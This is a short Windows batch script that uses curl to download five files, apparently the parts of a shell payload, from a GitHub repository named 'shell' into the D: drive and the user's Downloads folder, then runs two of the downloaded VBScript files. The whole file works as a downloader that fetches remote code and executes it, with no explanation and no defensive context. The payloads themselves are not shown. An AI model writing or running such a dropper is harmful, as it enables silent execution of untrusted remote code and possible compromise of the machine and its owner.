@echo off
set "downloads_dir=%USERPROFILE%\Downloads"
curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o D:\pro.bat
curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o D:\sh.py
curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o D:\vb.vbs
curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.vbs -o "%downloads_dir%\vb1.vbs"
curl https://raw.githubusercontent.com/0x2034/shell/main/post.bat -o "%downloads_dir%\post.bat"
start /wait D:\vb.vbs
call "%downloads_dir%\vb1.vbs"
exit
